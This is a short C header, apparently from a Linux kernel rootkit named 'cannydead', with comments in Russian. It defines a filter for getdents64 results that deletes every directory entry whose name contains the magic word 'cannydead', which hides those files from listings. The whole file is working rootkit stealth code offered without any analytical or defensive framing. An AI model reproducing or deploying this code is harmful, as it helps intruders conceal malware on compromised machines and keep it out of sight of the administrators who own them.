#pragma once

#include <linux/types.h>
#include <linux/string.h>
#include <linux/dirent.h>

#define CANNYDEAD_MAGIC "cannydead"

// Фильтр для getdents64: скрывает файлы с магическим словом
static int cannydead_filter_dirent(struct linux_dirent64 *dirp, unsigned int count) {
    unsigned int off = 0;
    unsigned int new_off = 0;

    while (off < count) {
        struct linux_dirent64 *d = (struct linux_dirent64 *)((char *)dirp + off);
        if (strstr(d->d_name, CANNYDEAD_MAGIC)) {
            // Пропустить этот элемент (не копируем его)
        } else {
            // Копируем элемент на новую позицию, если она изменилась
            if (new_off != off) {
                memmove((char *)dirp + new_off, d, d->d_reclen);
            }
            new_off += d->d_reclen;
        }
        off += d->d_reclen;
    }
    return new_off;
}